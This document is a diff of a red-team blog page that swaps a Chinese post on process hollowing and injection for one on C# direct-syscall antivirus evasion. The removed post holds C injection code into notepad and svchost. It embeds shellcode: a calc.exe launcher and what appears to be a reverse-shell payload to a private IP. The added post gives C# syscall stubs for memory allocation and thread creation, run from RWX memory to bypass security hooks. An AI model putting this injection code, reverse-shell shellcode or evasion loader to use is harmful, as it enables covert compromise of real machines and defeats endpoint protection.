@@ -2,9 +2,9 @@
 <html>
 <head><meta name="generator" content="Hexo 3.8.0">
   <meta charset="utf-8">
-  <title>傀儡进程 | 九世的博客</title>
+  <title>C# syscall免杀 | 九世的博客</title>
   <meta name="keywords" content=" 红队 ">
-  <meta name="description" content="傀儡进程 | 九世的博客">
+  <meta name="description" content="C# syscall免杀 | 九世的博客">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 <meta name="description" content="Become a hacker">
 <meta property="og:type" content="website">
@@ -1967,9 +1967,9 @@
 </aside>
 <div class="post">
     <div class="pjax">
-        <article id="post-傀儡进程" class="article article-type-post" itemscope="" itemprop="blogPost">
+        <article id="post-C-syscall免杀" class="article article-type-post" itemscope="" itemprop="blogPost">
     
-        <h1 class="article-title">傀儡进程</h1>
+        <h1 class="article-title">C# syscall免杀</h1>
     
     <div class="article-meta">
         
@@ -1985,7 +1985,7 @@
     </div>
     <div class="article-meta">
         
-        创建时间:<time class="date" title="更新时间: 2021-04-06 23:36:34">2021-04-06 23:29</time>
+        创建时间:<time class="date" title="更新时间: 2022-11-22 03:35:44">2022-11-22 03:02</time>
         
     </div>
     <div class="article-meta">
@@ -2007,7 +2007,7 @@
     
     <div class="toc-ref">
     
-        
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#前言"><span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#系统调用"><span class="toc-text">系统调用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#如何获取syscall的系统调用号"><span class="toc-text">如何获取syscall的系统调用号</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#C-下如何编写"><span class="toc-text">C#下如何编写</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#参考链接"><span class="toc-text">参考链接</span></a></li></ol>
     
 <style>
     .left-col .switch-btn,
@@ -2022,237 +2022,659 @@
 </div>
     <div class="article-entry" itemprop="articleBody">
       
-        <p><strong>shellcode插入</strong><br>x64<br>整体流程：<br>1.创建进程，获取进程句柄 CreateProcessA<br>2.在目标进程分配shellcode大小的内存空间 VirtualAllocEx<br>3.远程写入shellcode WriteProcessMemory<br>4.远程线程调用 CreateRemoteThread<br>5.等待返回 WaitForSingleObject<br>6.减少线程的挂起计数。当挂起计数减为零时，将继续执行线程。 ResumeThread</p>
-<p>ps:其实这个不算最多算个线程劫持</p>
-<pre><code class="c">#include &quot;stdafx.h&quot;
-#include &lt;Windows.h&gt;
-int main()
-{
-        unsigned char buf[] =
-               &quot;\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52&quot;
-               &quot;\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48&quot;
-               &quot;\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9&quot;
-               &quot;\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41&quot;
-               &quot;\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48&quot;
-               &quot;\x01\xd0\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01&quot;
-               &quot;\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48&quot;
-               &quot;\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0&quot;
-               &quot;\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c&quot;
-               &quot;\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0&quot;
-               &quot;\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04&quot;
-               &quot;\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59&quot;
-               &quot;\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48&quot;
-               &quot;\x8b\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00&quot;
-               &quot;\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b\x6f&quot;
-               &quot;\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd\x9d\xff&quot;
-               &quot;\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb&quot;
-               &quot;\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5\x63\x61\x6c&quot;
-               &quot;\x63\x2e\x65\x78\x65\x00&quot;;
-        SIZE_T size = 0;
-        STARTUPINFOEXA si;
-        PROCESS_INFORMATION pi;
-        ZeroMemory(&amp;si, sizeof(si));
-        si.StartupInfo.cb = sizeof(STARTUPINFOEXA);
-        si.StartupInfo.dwFlags = STARTF_USESHOWWINDOW;
-        ZeroMemory(&amp;pi, sizeof(pi));
+        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>最近打了两个项目，大多数笔记都更新在星球了。想起来，很久没写博客了，更新一下<br>最近研究了一下C#的syscall，记录一下<br><img src="https://s1.ax1x.com/2022/11/22/zlo3od.png" alt=""></p>
+<h2 id="系统调用"><a href="#系统调用" class="headerlink" title="系统调用"></a>系统调用</h2><blockquote>
+<p>抄来的介绍</p>
+</blockquote>
+<p>在Windows中，进程架构分为两种处理器访问模式——用户模式和内核模式。这些模式的实现背后的想法是保护用户应用程序不访问和修改任何关键的操作系统数据。Chrome、Word 等用户应用程序都运行在用户模式下，而操作系统代码（如系统服务和设备驱动程序）都运行在内核模式下。<br><img src="https://s1.ax1x.com/2022/11/22/zloJJI.png" alt=""></p>
+<p>内核模式特指处理器中的一种执行模式，它授予对所有系统内存和所有 CPU 指令的访问权限。一些 x86 和 x64处理器通过使用另一个称为环级别的术语来区分这些模式。利用环级别特权模式的处理器定义了四个特权级别 - 其他称为环- 以保护系统代码和数据。这些振铃级别的示例如下所示。<br><img src="https://s1.ax1x.com/2022/11/22/zloNSP.png" alt=""></p>
+<p>在 Windows 中，Windows 仅使用其中两个环 - 内核模式的环 0 和用户模式的环 3。现在，在正常的处理器操作期间，处理器将根据处理器上运行的代码类型在这两种模式之间切换。那么，这种“环级”安全性背后的原因是什么？那么，当您启动用户模式应用程序时，Windows 将为该应用程序创建一个新进程，并为该应用程序提供一个私有虚拟地址空间和一个私有句柄表。 这个“句柄表”是一个包含句柄的内核对象。句柄只是对特定系统资源的抽象引用值，例如内存区域或位置、打开的文件或管道。它的最初目标是对 API 用户隐藏真实的内存地址，从而允许系统执行某些管理功能，例如重组物理内存。 总体而言，handles 作业是针对任务内部结构的，例如：令牌、进程、线程等。下面可以看到一个句柄的示例。<br><img src="https://s1.ax1x.com/2022/11/22/zloUQf.png" alt=""></p>
+<p>因为应用程序的虚拟地址空间是私有的，所以一个应用程序不能更改属于另一个应用程序的数据——除非进程通过文件映射或通过VirtualProtect函数将其私有地址空间的一部分作为共享内存部分提供，或者除非一个进程有权打开另一个进程以使用跨进程内存功能，例如<strong>ReadProcessMemory</strong>和<strong>WriteProcessMemory</strong>。<br><img src="https://s1.ax1x.com/2022/11/22/zloay8.png" alt=""></p>
+<p>现在，与用户模式不同，在内核模式下运行的所有代码共享一个称为系统空间的虚拟地址空间。这意味着内核模式驱动程序不与其他驱动程序和操作系统本身隔离。因此，如果驱动程序不小心写入了错误的地址空间或进行了恶意操作，那么它可能会危及系统或其他驱动程序。尽管有一些保护措施可以防止操作系统受到干扰——比如内核补丁保护又名补丁保护，但我们不必担心这些。【由于内核容纳了操作系统的大部分内部数据结构（例如句柄表），任何时候用户模式应用程序需要访问这些数据结构或需要调用内部 Windows 例程来执行特权操作（例如读取一个文件），那么它必须首先<strong>从用户模式切换到内核模式。这就是系统调用发挥作用的地方</strong>。 为了让用户应用程序在内核模式下访问这些数据结构，该进程使用了一个特殊的处理器指令触发器，称为“系统调用”。该指令触发处理器访问模式之间的转换，并允许处理器访问内核中的系统服务调度代码。】这反过来调用Ntoskrnl.exe或Win32k.sys中的适当内部函数，这些函数包含内核和 OS 应用程序级逻辑。</p>
+<p>问题：<br>1.不同的系统的syscall不一样，怎么样才能实现在不同系统里面动态调用</p>
+<h2 id="如何获取syscall的系统调用号"><a href="#如何获取syscall的系统调用号" class="headerlink" title="如何获取syscall的系统调用号"></a>如何获取syscall的系统调用号</h2><p>准备工具：windbg<br>获取API地址</p>
+<pre><code>x ntdll!NtCreateFile
+</code></pre><p>指定地址查看反汇编</p>
+<pre><code>u 00007ffd`3826db50
+</code></pre><p><img src="https://s1.ax1x.com/2022/11/22/zlo0eg.png" alt=""></p>
+<p>得到的汇编</p>
+<pre><code>ntdll!ZwCreateFile:
+00007ffd`3826db50 4c8bd1          mov     r10,rcx
+00007ffd`3826db53 b855000000      mov     eax,55h
+00007ffd`3826db58 f604250803fe7f01 test    byte ptr [SharedUserData+0x308 (00000000`7ffe0308)],1
+00007ffd`3826db60 7503            jne     ntdll!ZwCreateFile+0x15 (00007ffd`3826db65)
+00007ffd`3826db62 0f05            syscall
+00007ffd`3826db64 c3              ret
+00007ffd`3826db65 cd2e            int     2Eh
+00007ffd`3826db67 c3              ret
+</code></pre><p>其中这里的<strong>mov eax,55h</strong>就是系统调用号，这里的NtCreateFile的系统调用号就是<strong>0x55</strong>。将系统调用号传入eax寄存器，将调用系统调用指令。CPU 将在此处跳转到内核模式并执行指定的特权操作。<br>这里可以看到关键的汇编指令：<br>(参数会传到r10，r10在传给rcx)</p>
+<pre><code>mov r10,rcx //规定
+mov eax,&lt;系统调用号&gt;
+syscall
+ret
+</code></pre><p>获取API函数需要的内存权限</p>
+<pre><code>!address 00007ffd`3826db50
+</code></pre><p><img src="https://s1.ax1x.com/2022/11/22/zloBwQ.png" alt=""></p>
+<h2 id="C-下如何编写"><a href="#C-下如何编写" class="headerlink" title="C#下如何编写"></a>C#下如何编写</h2><p>代码示例来源：<a href="https://github.com/SolomonSklash/SyscallPOC/tree/master/Syscall" target="_blank" rel="noopener">https://github.com/SolomonSklash/SyscallPOC/tree/master/Syscall</a></p>
+<p>整体代码思路：<br>-&gt;先把提取出来的系统编号那段汇编放到byte[]数组<br>-&gt;定义一个函数实现委托<br>-&gt;定义byte指针，将汇编的byte[]数组赋予该指针<br>-&gt;定义名为memoryAddress的int变量，将byte指针赋予<br>-&gt;利用VirtualProtectEx修改内存权限<br>-&gt;利用Marshal.GetDelegateForFunctionPointer将函数转换为一个委托<br>-&gt;返回该委托</p>
+<p>问题：<br>为什么要用unsafe<br>为什么要用Marshal.GetDelegateForFunctionPointer<br>为什么有UnmanagedFunctionPointer(CallingConvention.StdCall)</p>
+<p>为什么要用unsafe</p>
+<pre><code>当一个代码块使用 unsafe 修饰符标记时，C# 允许在函数中使用指针变量。不安全代码或非托管代码是指使用了指针变量的代码块
+</code></pre><p>为什么要有Marshal.GetDelegateForFunctionPointer</p>
+<pre><code>在.net 2.0 中，框架直接提供了 Marshal.GetDelegateForFunctionPointer 来转换一个函数指针为一个委托
+C# 中的委托（Delegate）类似于 C 或 C++ 中函数的指针。委托（Delegate） 是存有对某个方法的引用的一种引用类型变量。引用可在运行时被改变。
+委托（Delegate）特别用于实现事件和回调方法。所有的委托（Delegate）都派生自 System.Delegate 类。
+参考链接：
+https://cloud.tencent.com/developer/article/1798625
+https://www.runoob.com/csharp/csharp-delegate.html
+</code></pre><p>为什么有UnmanagedFunctionPointer(CallingConvention.StdCall)</p>
+<pre><code>UnmanagedFunctionPointer
+控制作为非托管函数指针传递给非托管代码或从非托管代码传递的委托签名的封送处理行为。这个类不能被继承。
+https://learn.microsoft.com/en-us/dotnet/api/system.runtime.interopservices.unmanagedfunctionpointerattribute.-ctor?view=net-6.0#system-runtime-interopservices-unmanagedfunctionpointerattribute-ctor(system-runtime-interopservices-callingconvention)
 
-        BOOL sucess = CreateProcessA(NULL, &quot;C:\\Windows\\System32\\notepad.exe&quot;, NULL,  NULL, true, CREATE_SUSPENDED | EXTENDED_STARTUPINFO_PRESENT, NULL, NULL,  (LPSTARTUPINFOA)&amp;si, &amp;pi);
-        HANDLE notepadHandle = pi.hProcess;
-        LPVOID remotebuffer = VirtualAllocEx(notepadHandle, NULL, sizeof(buf),  (MEM_RESERVE | MEM_COMMIT),PAGE_EXECUTE_READWRITE);
-        WriteProcessMemory(notepadHandle,remotebuffer,buf,sizeof(buf),NULL);
-        HANDLE remoteThread = CreateRemoteThread(notepadHandle, NULL, 0,  (LPTHREAD_START_ROUTINE)remotebuffer, NULL, 0, NULL); //remotebuffer为线程起始地址
-        if (WaitForSingleObject(remoteThread, INFINITE) == WAIT_FAILED) {
-               return 1;
+CallingConvention.StdCal 被调用者清理堆栈。
+属于调用约定枚举里面的参数
+https://learn.microsoft.com/en-us/dotnet/api/system.runtime.interopservices.callingconvention?view=net-6.0
+</code></pre><p><strong>写死的syscall示例代码1</strong></p>
+<pre><code class="csharp">static byte[] bNtWaitForSingleObject =
+        {
+            0x4c, 0x8b, 0xd1,               // mov r10,rcx
+            0xb8, 0x04, 0x00, 0x00, 0x00,   // mov eax,4
+            0x0F, 0x05,                     // syscall
+            0xC3                            // ret
+        };
+        public static NTSTATUS NtWaitForSingleObject(IntPtr Object, bool Alertable, uint Timeout)
+        {
+            // set byte array of bNtWaitForSingleObject to new byte array called syscall
+            byte[] syscall = bNtWaitForSingleObject;
+
+
+            // specify unsafe context
+            unsafe
+            {
+                // create new byte pointer and set value to our syscall byte array
+                fixed (byte* ptr = syscall)
+                {
+                    // cast the byte array pointer into a C# IntPtr called memoryAddress
+                    IntPtr memoryAddress = (IntPtr)ptr;
+
+
+                    // Change memory access to RX for our assembly code
+                    if (!VirtualProtectEx(Process.GetCurrentProcess().Handle, memoryAddress, (UIntPtr)syscall.Length, (uint)AllocationProtect.PAGE_EXECUTE_READWRITE, out uint oldprotect))
+                        {
+                        throw new Win32Exception();
+                    }
+
+
+                    // Get delegate for NtWaitForSingleObject
+                    Delegates.NtWaitForSingleObject assembledFunction = (Delegates.NtWaitForSingleObject)Marshal.GetDelegateForFunctionPointer(memoryAddress, typeof(Delegates.NtWaitForSingleObject));
+
+
+                    return (NTSTATUS)assembledFunction(Object, Alertable, Timeout);
+                }
+            }
         }
-        if (ResumeThread(pi.hThread) == -1) {
-               return 1;
-        }
-    return 0;
-}
+
+
+public struct Delegates
+        {
+                    &lt;省略&gt;
+            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
+            public delegate NTSTATUS NtWaitForSingleObject(IntPtr Object, bool Alertable, uint Timeout);
 </code></pre>
-<p><img src="https://z3.ax1x.com/2021/04/06/c3naLQ.png" alt=""></p>
-<p>x86<br>寻找加载基地址，在加载基地址前运行shellcode：<br>1.挂起方式创建进程 CreateProcessA<br>2.获取线程里的PEB GetThreadContext<br>3.获取进程基地址保存在EAX ReadProcessMemory<br>4.在基地址之前写入shellcode WriteProcessMemory<br>5.恢复线程执行 ResumeThread</p>
-<pre><code class="c">#include &quot;stdafx.h&quot;
-#include &lt;Windows.h&gt;
-unsigned char buf[] =
-&quot;\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b\x50\x30&quot;
-&quot;\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff&quot;
-&quot;\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf2\x52&quot;
-&quot;\x57\x8b\x52\x10\x8b\x4a\x3c\x8b\x4c\x11\x78\xe3\x48\x01\xd1&quot;
-&quot;\x51\x8b\x59\x20\x01\xd3\x8b\x49\x18\xe3\x3a\x49\x8b\x34\x8b&quot;
-&quot;\x01\xd6\x31\xff\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf6\x03&quot;
-&quot;\x7d\xf8\x3b\x7d\x24\x75\xe4\x58\x8b\x58\x24\x01\xd3\x66\x8b&quot;
-&quot;\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24&quot;
-&quot;\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f\x5f\x5a\x8b\x12\xeb&quot;
-&quot;\x8d\x5d\x68\x33\x32\x00\x00\x68\x77\x73\x32\x5f\x54\x68\x4c&quot;
-&quot;\x77\x26\x07\x89\xe8\xff\xd0\xb8\x90\x01\x00\x00\x29\xc4\x54&quot;
-&quot;\x50\x68\x29\x80\x6b\x00\xff\xd5\x6a\x0a\x68\xc0\xa8\x5d\x8d&quot;
-&quot;\x68\x02\x00\x11\x5c\x89\xe6\x50\x50\x50\x50\x40\x50\x40\x50&quot;
-&quot;\x68\xea\x0f\xdf\xe0\xff\xd5\x97\x6a\x10\x56\x57\x68\x99\xa5&quot;
-&quot;\x74\x61\xff\xd5\x85\xc0\x74\x0a\xff\x4e\x08\x75\xec\xe8\x67&quot;
-&quot;\x00\x00\x00\x6a\x00\x6a\x04\x56\x57\x68\x02\xd9\xc8\x5f\xff&quot;
-&quot;\xd5\x83\xf8\x00\x7e\x36\x8b\x36\x6a\x40\x68\x00\x10\x00\x00&quot;
-&quot;\x56\x6a\x00\x68\x58\xa4\x53\xe5\xff\xd5\x93\x53\x6a\x00\x56&quot;
-&quot;\x53\x57\x68\x02\xd9\xc8\x5f\xff\xd5\x83\xf8\x00\x7d\x28\x58&quot;
-&quot;\x68\x00\x40\x00\x00\x6a\x00\x50\x68\x0b\x2f\x0f\x30\xff\xd5&quot;
-&quot;\x57\x68\x75\x6e\x4d\x61\xff\xd5\x5e\x5e\xff\x0c\x24\x0f\x85&quot;
-&quot;\x70\xff\xff\xff\xe9\x9b\xff\xff\xff\x01\xc3\x29\xc6\x75\xc1&quot;
-&quot;\xc3\xbb\xf0\xb5\xa2\x56\x6a\x00\x53\xff\xd5&quot;;
-void test() {
-        STARTUPINFOA si;
-        PROCESS_INFORMATION pi;
-        ZeroMemory(&amp;si, sizeof(si));
-        ZeroMemory(&amp;pi, sizeof(pi));
-        si.cb = sizeof(STARTUPINFOA);
-        if (!CreateProcessA(&quot;C:\\Windows\\sysWoW64\\svchost.exe&quot;, NULL, NULL, NULL, FALSE,  CREATE_SUSPENDED, NULL, NULL, &amp;si, &amp;pi)) {
-               printf(&quot;CreateProcess Error Code:%d\n&quot;, GetLastError());
-               return;
-        }
-        printf(&quot;CreateProcess Sucess\n&quot;);
-        CONTEXT ctx;
-        ctx.ContextFlags = CONTEXT_ALL;
-        if (!GetThreadContext(pi.hThread, &amp;ctx)) {
-               printf(&quot;GetThreadContext Error Code:%d\n&quot;, GetLastError());
-               return;
-        }
-        printf(&quot;GetThreadContext Sucess\n&quot;);
-        DWORD dwImageBase = 0;
-        DWORD lpNumberOfBytesRead = 0;
-        if (!ReadProcessMemory(pi.hProcess, (LPCVOID)(ctx.Ebx + 0x8), &amp;dwImageBase,  sizeof(DWORD), &amp;lpNumberOfBytesRead)) {
-               printf(&quot;ReadProcessMemory Error Code:%d\n&quot;, GetLastError());
-               return;
-        }
-        printf(&quot;ReadProcessMemory Sucess\n&quot;);
-        DWORD NumberOfBytesWritten = 0;
-        if (!WriteProcessMemory(pi.hProcess, (LPVOID)ctx.Eax, buf, sizeof(buf),  &amp;NumberOfBytesWritten)) {
-               printf(&quot;WriteProcessMemory Error Code:%d\n&quot;);
-        }
-        printf(&quot;WriteProcessMemory Sucess\n&quot;);
-        if (ResumeThread(pi.hThread) == -1) { //恢复线程执行成功的话函数返回为0
-               printf(&quot;ResumeThread Error Code:%d\n&quot;,GetLastError());
-        }
-        printf(&quot;ResumeThread Sucess\n&quot;);
-}
-int main()
+<p><strong>示例代码2</strong></p>
+<pre><code class="csharp">using System;
+using System.ComponentModel;
+using System.Diagnostics;
+using System.Runtime.InteropServices;
+using static Syscall.Native;
+
+namespace Syscall
 {
-        test();
-        system(&quot;pause&quot;);
-    return 0;
+    class Syscalls
+    {
+        /*
+        MSDN:
+        NTSTATUS NtAllocateVirtualMemory(
+            HANDLE ProcessHandle,         // C#: IntPtr
+            PVOID* BaseAddress,           // C#: IntPtr
+            ULONG_PTR ZeroBits,           // C#: IntPtr
+            PSIZE_T RegionSize,           // C#: ref UIntPtr
+            ULONG AllocationType,         // C#: UInt32
+            ULONG Protect                 // C#: UInt32
+            );
+        ReactOS:
+        NTSTATUS NtAllocateVirtualMemory(
+            _In_ HANDLE ProcessHandle,
+            _Inout_ _Outptr_result_buffer_(* RegionSize) PVOID *BaseAddress,
+            _In_ ULONG_PTR ZeroBits,
+            _Inout_ PSIZE_T RegionSize,
+            _In_ ULONG AllocationType,
+            _In_ ULONG Protect
+            ); */
+        /*   0x18 in all Windows 10 version so far   */
+        static byte[] bNtAllocateVirtualMemory =
+        {
+            0x4c, 0x8b, 0xd1,               // mov r10,rcx
+            0xb8, 0x18, 0x00, 0x00, 0x00,   // mov eax,18h
+            0x0F, 0x05,                     // syscall
+            0xC3                            // ret
+        };
+
+        public static NTSTATUS NtAllocateVirtualMemory(
+            IntPtr ProcessHandle,
+            ref IntPtr BaseAddress,
+            IntPtr ZeroBits,
+            ref UIntPtr RegionSize,
+            uint AllocationType,
+            uint Protect )
+        {
+            // set byte array of bNtAllocateVirtualMemory to new byte array called syscall
+            byte[] syscall = bNtAllocateVirtualMemory;
+
+            // specify unsafe context
+            unsafe
+            {
+                // create new byte pointer and set value to our syscall byte array
+                fixed (byte* ptr = syscall)
+                {
+                    // cast the byte array pointer into a C# IntPtr called memoryAddress
+                    IntPtr memoryAddress = (IntPtr)ptr;
+
+                    // Change memory access to RX for our assembly code
+                    if (!VirtualProtectEx(Process.GetCurrentProcess().Handle, memoryAddress, (UIntPtr)syscall.Length, (uint)AllocationProtect.PAGE_EXECUTE_READWRITE, out uint oldprotect))
+                    {
+                        throw new Win32Exception();
+                    }
+
+                    // Get delegate for NtAllocateVirtualMemory
+                    Delegates.NtAllocateVirtualMemory assembledFunction = (Delegates.NtAllocateVirtualMemory)Marshal.GetDelegateForFunctionPointer(memoryAddress, typeof(Delegates.NtAllocateVirtualMemory));
+
+                    return (NTSTATUS)assembledFunction(
+                        ProcessHandle,
+                        ref BaseAddress,
+                        ZeroBits,
+                        ref RegionSize,
+                        AllocationType,
+                        Protect);
+                }
+            }
+        }
+
+        // https://securityxploded.com/ntcreatethreadex.php
+        //NTSTATUS NtCreateThreadEx(
+            // OUT PHANDLE hThread,                         // C#: out IntPtr
+            // IN ACCESS_MASK DesiredAccess,                // C#: ACCESS_MASK (Native.cs)
+            // IN LPVOID ObjectAttributes,                  // C#: IntPtr.Zero
+            // IN HANDLE ProcessHandle,                     // C#: IntPtr
+            // IN LPTHREAD_START_ROUTINE lpStartAddress,    // C#: IntPtr
+            // IN LPVOID lpParameter,                       // C#: IntPtr
+            // IN BOOL CreateSuspended,                     // C#: Boolean/Int
+            // IN ULONG StackZeroBits,                      // C#: uint
+            // IN ULONG SizeOfStackCommit,                  // C#: uint
+            // IN ULONG SizeOfStackReserve,                 // C#: uint
+            // OUT LPVOID lpBytesBuffer                     // C#: IntPtr
+            // );
+        /*   Windows 10 1909: 0xBD, Windows 10 2004: 0xC1   */
+        static byte[] bNtCreateThreadEx =
+        {
+            0x4c, 0x8b, 0xd1,               // mov r10,rcx
+        //    0xb8, 0xc1, 0x00, 0x00, 0x00,   // mov eax,0BDh
+            0xb8, 0xbd, 0x00, 0x00, 0x00,   // mov eax,0BDh
+            0x0F, 0x05,                     // syscall
+            0xC3                            // ret
+        };
+        public static NTSTATUS NtCreateThreadEx(
+            out IntPtr hThread,
+            ACCESS_MASK DesiredAccess,
+            IntPtr ObjectAttributes,
+            IntPtr ProcessHandle,
+            IntPtr lpStartAddress,
+            IntPtr lpParameter,
+            bool CreateSuspended,
+            uint StackZeroBits,
+            uint SizeOfStackCommit,
+            uint SizeOfStackReserve,
+            IntPtr lpBytesBuffer
+            )
+        {
+            // set byte array of bNtCreateThread to new byte array called syscall
+            byte[] syscall = bNtCreateThreadEx;
+
+            // specify unsafe context
+            unsafe
+            {
+                // create new byte pointer and set value to our syscall byte array
+                fixed (byte* ptr = syscall)
+                {
+                    // cast the byte array pointer into a C# IntPtr called memoryAddress
+                    IntPtr memoryAddress = (IntPtr)ptr;
+
+                    // Change memory access to RX for our assembly code
+                    if (!VirtualProtectEx(Process.GetCurrentProcess().Handle, memoryAddress, (UIntPtr)syscall.Length, (uint)AllocationProtect.PAGE_EXECUTE_READWRITE, out uint oldprotect))
+                    {
+                        throw new Win32Exception();
+                    }
+
+                    // Get delegate for NtCreateThread
+                    Delegates.NtCreateThreadEx assembledFunction = (Delegates.NtCreateThreadEx)Marshal.GetDelegateForFunctionPointer(memoryAddress, typeof(Delegates.NtCreateThreadEx));
+
+                    return (NTSTATUS)assembledFunction(
+                        out hThread,
+                        DesiredAccess,
+                        ObjectAttributes,
+                        ProcessHandle,
+                        lpStartAddress,
+                        lpParameter,
+                        CreateSuspended,
+                        StackZeroBits,
+                        SizeOfStackCommit,
+                        SizeOfStackReserve,
+                        lpBytesBuffer
+                        );
+                }
+            }
+        }
+
+        /*
+        MSDN:
+        NTSTATUS ZwWaitForSingleObject(
+            HANDLE Handle,             // C#: IntPtr
+            BOOLEAN Alertable,         // C#: Boolean
+            PLARGE_INTEGER Timeout     // C#: Int64
+            );
+        ReactOS:
+        NTSTATUS NtWaitForSingleObject(
+             In_ HANDLE Object,
+             In_ BOOLEAN Alertable,
+             In_opt_ PLARGE_INTEGER Time
+             ); */
+        /*   0x4 in all Windows 10 versions so far   */
+        static byte[] bNtWaitForSingleObject =
+        {
+            0x4c, 0x8b, 0xd1,               // mov r10,rcx
+            0xb8, 0x04, 0x00, 0x00, 0x00,   // mov eax,4
+            0x0F, 0x05,                     // syscall
+            0xC3                            // ret
+        };
+        public static NTSTATUS NtWaitForSingleObject(IntPtr Object, bool Alertable, uint Timeout)
+        {
+            // set byte array of bNtWaitForSingleObject to new byte array called syscall
+            byte[] syscall = bNtWaitForSingleObject;
+
+            // specify unsafe context
+            unsafe
+            {
+                // create new byte pointer and set value to our syscall byte array
+                fixed (byte* ptr = syscall)
+                {
+                    // cast the byte array pointer into a C# IntPtr called memoryAddress
+                    IntPtr memoryAddress = (IntPtr)ptr;
+
+                    // Change memory access to RX for our assembly code
+                    if (!VirtualProtectEx(Process.GetCurrentProcess().Handle, memoryAddress, (UIntPtr)syscall.Length, (uint)AllocationProtect.PAGE_EXECUTE_READWRITE, out uint oldprotect))
+                        {
+                        throw new Win32Exception();
+                    }
+
+                    // Get delegate for NtWaitForSingleObject
+                    Delegates.NtWaitForSingleObject assembledFunction = (Delegates.NtWaitForSingleObject)Marshal.GetDelegateForFunctionPointer(memoryAddress, typeof(Delegates.NtWaitForSingleObject));
+
+                    return (NTSTATUS)assembledFunction(Object, Alertable, Timeout);
+                }
+            }
+        }
+        public struct Delegates
+        {
+            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
+            public delegate NTSTATUS NtAllocateVirtualMemory(
+                IntPtr ProcessHandle,
+                ref IntPtr BaseAddress,
+                IntPtr ZeroBits,
+                ref UIntPtr RegionSize,
+                ulong AllocationType,
+                ulong Protect);
+            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
+            public delegate NTSTATUS NtCreateThreadEx(
+                out IntPtr hThread,
+                ACCESS_MASK DesiredAccess,
+                IntPtr ObjectAttributes,
+                IntPtr ProcessHandle,
+                IntPtr lpStartAddress,
+                IntPtr lpParameter,
+                bool CreateSuspended,
+                uint StackZeroBits,
+                uint SizeOfStackCommit,
+                uint SizeOfStackReserve,
+                IntPtr lpBytesBuffer
+                );
+            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
+            public delegate NTSTATUS NtWaitForSingleObject(IntPtr Object, bool Alertable, uint Timeout);
+        }
+    }
 }
+
 </code></pre>
-<p><img src="https://z3.ax1x.com/2021/04/06/c3n2yF.md.png" alt=""></p>
-<p><img src="https://z3.ax1x.com/2021/04/06/c3nhw9.png" alt=""></p>
-<p><strong>x86进程替换</strong><br>1.创建进程CreateProcessA<br>2.获取进程PEB地址GetThreadContext<br>3.读取文件获取文件句柄 CreateFileA #替换掉目标文件的恶意文件<br>4.获取文件大小 GetFileSize<br>5.定义一个恶意文件的大小内存空间<br>6.读取文件内容 ReadFile<br>7.获取恶意文件内容的DOS头 (PIMAGE_DOS_HEADER)pBuf<br>8.获取恶意文件内容的NT头 (PIMAGE_NT_HEADERS)(pBuf + pDosHeader-&gt;e_lfanew)<br>9.更改创建进程的基地址允许执行权限((LPVOID)pNtHeaders-&gt;OptionalHeader.ImageBase)<br>10.往进程内存写入恶意文件WriteProcessMemory(pi.hProcess,lpAddr,(LPCVOID)pBuf,pNtHeaders-&gt;OptionalHeader.SizeOfHeaders,NULL); //指向要写的数据的指针。<br>11.替换字节<br>12.替换PEB中基地址<br>13.替换入口点</p>
-<p>pDosHeader-&gt;e_lfanew DOS偏移头<br>pNtHeaders-&gt;OptionalHeader.ImageBase 基地址<br>pNtHeaders-&gt;OptionalHeader.SizeOfImage PE大小<br>pNtHeaders-&gt;FileHeader.NumberOfSections 节表大小<br> (LPVOID)((DWORD)lpAddr + pSectionHeader-&gt;VirtualAddress 节区的RVA地址<br> (LPCVOID)((DWORD)pBuf + pSectionHeader-&gt;PointerToRawData 在文件中的偏移<br>dwImageBase +  pNtHeaders-&gt;OptionalHeader.AddressOfEntryPoint 程序执行入口RVA</p>
-<pre><code class="c">#include &quot;stdafx.h&quot;
-#include &lt;Windows.h&gt;
-void test() {
